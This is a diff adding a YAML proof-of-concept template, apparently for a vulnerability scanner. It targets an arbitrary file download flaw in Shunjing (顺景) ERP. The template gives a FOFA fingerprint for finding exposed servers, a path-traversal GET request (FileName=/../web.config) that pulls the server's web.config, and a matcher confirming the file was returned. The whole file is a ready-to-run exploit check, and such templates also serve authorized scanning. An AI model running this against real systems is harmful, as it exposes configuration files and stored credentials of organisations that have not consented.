@@ -1,0 +1,16 @@
+id: poc-yaml-centersoft-downloadgetfile-anyfile-download
+info:
+  name: 顺景ERP DownloadGetFile 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 顺景ERP管理系统
+  fofa: body="顺景软件 WebAPI 服务端"
+requests:
+- method: GET
+  path: /api/Download/GetFile?FileName=/../web.config&Title=
+  expression: "status_code == 200 && \ncontains(body,\"<configuration>\") &&\ncontains(body,\"\
+    system.web\") &&\ncontains(content_type,\"application/octet-stream\") &&\ncontains(headers,\"\
+    filename=.config\")\n"
+variables: {}
+transport: http
